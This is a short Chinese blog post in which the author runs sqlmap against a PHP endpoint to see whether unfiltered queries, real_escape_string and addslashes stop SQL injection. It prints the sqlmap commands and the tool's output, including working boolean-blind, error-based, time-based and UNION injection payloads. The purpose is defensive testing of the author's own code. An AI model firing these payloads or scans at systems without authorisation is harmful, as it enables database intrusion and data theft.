---
title: sqlmap使用心得
date: 2017-01-13 18:44:31
categories: MySQL
---


## 缘由
今天想测试下ci框架的sql注入过滤效果，找到了sqlmap来进行接口sql注入效果。不用自己重复造轮子来模拟各种sql注入情况。
主要测试内容：
- 直接用`select * from table where id={$id}`看sqlmap工具效果
- 使用`real_escape_string`过滤测试效果
- 使用php的`addslashes`方法测试效果

## 下载
> http://sqlmap.org/

---

sqlmp参数说明，直接`sqlmap.py -h`看介绍。
- --dbms 指定数据库
- --level=LEVEL


## 模拟有sql注入的情况

测试接口：
> ./sqlmap.py -u "http://wufazuce.com/index.php?time=1"

```
sqlmap identified the following injection point(s) with a total of 188 HTTP(s) requests:
---
Parameter: time (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)
    Payload: time=1 OR NOT 5138=5138#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: time=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6271,(SELECT (ELT(3637=3637,1))),0x7178787a71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: time=1 OR SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: time=1 UNION ALL SELECT CONCAT(0x71626a6271,0x457a6c736b4d50776b6b64726471774444456b72447559596f6f684c6b68434b62736d4f7154656b,0x7178787a71),NULL,NULL,NULL-- DBwe
---
web application technology: PHP 5.6.22
back-end DBMS: MySQL >= 5.5
```

## 使用`real_escape_string`过滤测试效果
php中`real_escape_string`可以过滤防范。
> /sqlmap.py -u "http://wufazuce.com/finc/perform/trend?time=1"  --level=5 --dbms=mysql

```
[18:01:18] [INFO] testing connection to the target URL
[18:01:18] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[18:01:18] [INFO] testing if the target URL is stable
[18:01:19] [INFO] target URL is stable
[18:01:19] [INFO] testing if GET parameter 'time' is dynamic
[18:01:19] [INFO] confirming that GET parameter 'time' is dynamic
[18:01:19] [INFO] GET parameter 'time' is dynamic
[18:01:19] [WARNING] reflective value(s) found and filtering out
[18:01:19] [INFO] heuristic (basic) test shows that GET parameter 'time' might be injectable
[18:01:19] [INFO] testing for SQL injection on GET parameter 'time'
[18:01:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:01:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[18:01:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:01:20] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:01:20] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:01:20] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:01:21] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[18:01:21] [INFO] testing 'MySQL inline queries'
[18:01:21] [INFO] testing 'PostgreSQL inline queries'
[18:01:21] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[18:01:21] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:01:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:01:21] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:01:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[18:01:22] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:01:22] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:01:22] [INFO] testing 'Oracle AND time-based blind'
[18:01:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:01:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
[18:01:25] [WARNING] GET parameter 'time' does not seem to be injectable
[18:01:25] [CRITICAL] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment')

```

## 使用php的`addslashes`方法测试效果
`addslashes`方法前后不会自动加单引号`''`

## 感受
工具很强大，自己只用了点皮毛，后面有时间再深入研究。

## 参考资料
- Web安全之SQL注入攻击技巧与防范(http://www.plhwin.com/2014/06/13/web-security-sql/)
- 是否足够安全http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string
